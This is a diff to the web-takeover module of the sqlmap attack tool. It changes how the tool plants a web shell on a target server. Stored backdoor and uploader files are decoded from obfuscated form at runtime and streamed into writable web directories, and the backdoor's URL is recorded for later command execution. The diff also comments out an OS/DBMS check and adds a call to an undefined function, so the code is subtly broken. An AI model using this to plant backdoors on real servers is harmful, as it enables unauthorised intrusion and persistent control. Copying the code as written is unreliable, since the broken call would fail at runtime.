@@ -24,6 +24,7 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 import os
 import re
+import StringIO
 
 from lib.core.agent import agent
 from lib.core.common import fileToStr
@@ -37,6 +38,7 @@ from lib.core.data import logger
 from lib.core.data import paths
 from lib.core.exception import sqlmapUnsupportedDBMSException
 from lib.core.shell import autoCompletion
+from extra.cloak.cloak import decloak
 from lib.request.connect import Connect as Request
 
 
@@ -74,10 +76,13 @@ class Web:
         return output
 
     def webFileUpload(self, fileToUpload, destFileName, directory):
+        webStreamUpload(self, open(fileToUpload, "r"), destFileName, directory)
+        
+    def webFileStreamUpload(self, stream, destFileName, directory):
         if self.webApi == "php":
             multipartParams = {
                                 "upload":    "1",
-                                "file":      open(fileToUpload, "r"),
+                                "file":      stream,
                                 "uploadDir": directory,
                               }
             page = Request.getPage(url=self.webUploaderUrl, multipart=multipartParams)
@@ -90,7 +95,7 @@ class Web:
         elif self.webApi == "asp":
             backdoorRemotePath = "%s/%s" % (directory, destFileName)
             backdoorRemotePath = os.path.normpath(backdoorRemotePath)
-            backdoorContent = open(fileToUpload, "r").read()
+            backdoorContent = stream.read()
             postStr = "f=%s&d=%s" % (backdoorRemotePath, backdoorContent)
             page, _ = Request.getPage(url=self.webUploaderUrl, direct=True, post=postStr)
 
@@ -111,7 +116,7 @@ class Web:
         if self.webBackdoorUrl is not None and self.webUploaderUrl is not None and self.webApi is not None:
             return
 
-        self.checkDbmsOs()
+        #self.checkDbmsOs()
 
         kb.docRoot  = getDocRoot()
         directories = getDirs()
@@ -150,10 +155,13 @@ class Web:
                 logger.warn("invalid value, it must be 1 or 3")
 
         backdoorName = "backdoor.%s" % self.webApi
-        backdoorPath = os.path.join(paths.SQLMAP_SHELL_PATH, backdoorName)
+        backdoorStream = StringIO.StringIO(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, backdoorName + '_')))
+        
         uploaderName = "uploader.%s" % self.webApi
-        uploaderStr  = fileToStr(os.path.join(paths.SQLMAP_SHELL_PATH, uploaderName))
-
+        uploaderStream = StringIO.StringIO(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, uploaderName + '_')))
+        
+        uploaderStr  = uploaderStream.read()
+        
         for directory in directories:
             # Upload the uploader agent
             outFile     = os.path.normpath("%s/%s" % (directory, uploaderName))
@@ -182,7 +190,7 @@ class Web:
             infoMsg += "on '%s'" % directory
             logger.info(infoMsg)
 
-            self.webFileUpload(backdoorPath, backdoorName, directory)
+            self.webFileStreamUpload(backdoorStream, backdoorName, directory)
             self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
             self.webDirectory = directory
 
